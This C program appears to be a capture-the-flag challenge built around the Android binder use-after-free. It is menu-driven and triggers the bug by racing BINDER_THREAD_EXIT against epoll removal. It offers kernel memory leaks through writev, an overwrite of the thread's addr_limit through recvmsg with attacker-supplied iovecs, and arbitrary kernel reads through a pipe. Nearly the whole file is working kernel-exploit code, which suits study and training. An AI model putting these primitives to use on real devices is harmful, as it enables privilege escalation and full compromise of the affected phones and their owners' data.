#define _GNU_SOURCE
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/un.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <err.h>

#define BINDER_THREAD_EXIT 0x40046208ul
int read_pipe[2];
int leak_pipe[2];
int binder_fd, epoll_fd;
char buffer[8192];
char msg_buffer[50];
void *dummy_page;
unsigned long mmap_addr;
struct epoll_event event = { .events = EPOLLIN };
char iovec_buffer[512];

void alarm_handler() {
	puts("TIME OUT");
	exit(-1);
}

void initialize() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	signal(SIGALRM, alarm_handler);
	alarm(60);
}

void leak_memory() {
	if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event) == -1) exit(EXIT_FAILURE);
	if (fcntl(leak_pipe[0], F_SETPIPE_SZ, 0x1000) != 0x1000) exit(EXIT_FAILURE);

	printf("Data: ");
	read(0, iovec_buffer, sizeof(iovec_buffer));

	pid_t pid = fork();
	if (pid == -1) exit(EXIT_FAILURE);
	if (pid == 0) {
		sleep(1);
		epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);
		read(leak_pipe[0], buffer, 0x1000);
		close(leak_pipe[1]);
		exit(EXIT_SUCCESS);
	}
	ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
	writev(leak_pipe[1], (void*)iovec_buffer, 25);
	read(leak_pipe[0], buffer, sizeof(buffer));
}

void call_mmap() {
	if (!dummy_page) {
		printf("Addr: ");
		scanf("%lu", &mmap_addr);
		dummy_page = mmap((void*)mmap_addr, 0x20000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
		if (dummy_page == MAP_FAILED) exit(EXIT_FAILURE);
		printf("%p\n", dummy_page);
	}
}

void clobber_addr_limit() {
	printf("Data: ");
	read(0, iovec_buffer, sizeof(iovec_buffer));
	printf("Msg: ");
	read(0, msg_buffer, sizeof(msg_buffer));
	
	int socks[2];
	struct msghdr msg = { .msg_iov = (void*)iovec_buffer, .msg_iovlen = 25 };
	if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event) == -1) exit(EXIT_FAILURE);
	if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks) == -1) exit(EXIT_FAILURE);
	write(socks[1], " ", 1);
	pid_t pid = fork();
	if (pid == -1) exit(EXIT_FAILURE);
	if (pid == 0) {
		sleep(1);
		epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);
		write(socks[1], msg_buffer, sizeof(msg_buffer));
		exit(EXIT_SUCCESS);
	}
	ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
	recvmsg(socks[0], &msg, MSG_WAITALL);
}

void print_buffer() {
	write(1, buffer, sizeof(buffer));
}

void read_memory() {
	unsigned long long addr;
	size_t size;
	printf("Addr: ");
	scanf("%lu", &addr);
	if (addr < 0xffffff8000000000ULL) return;
	write(read_pipe[1], (void*)addr, 4096);
	read(read_pipe[0], buffer, 4096);
}

int main() {
	int idx;
	initialize();
	epoll_fd = epoll_create(1);
	binder_fd = open("/dev/binder", O_RDONLY);
	if (epoll_fd == -1 || binder_fd == -1) exit(EXIT_FAILURE);
	if (pipe(read_pipe) == -1) exit(EXIT_FAILURE);
	if (pipe(leak_pipe) == -1) exit(EXIT_FAILURE);

	while(1) {
		printf("1. Call mmap\n");
		printf("2. Read memory\n");
		printf("3. Leak memory\n");
		printf("4. Print buffer\n");
		printf("5. Clobber addr_limit\n");
		printf("> ");

		scanf("%d", &idx);
		switch(idx) {
			case 1:
				call_mmap();
				break;
			case 2:
				read_memory();
				break;
			case 3:
				leak_memory();
				break;
			case 4:
				print_buffer();
				break;
			case 5:
				clobber_addr_limit();
				break;
			default:
				break;
		}
	}
	return 0;
}
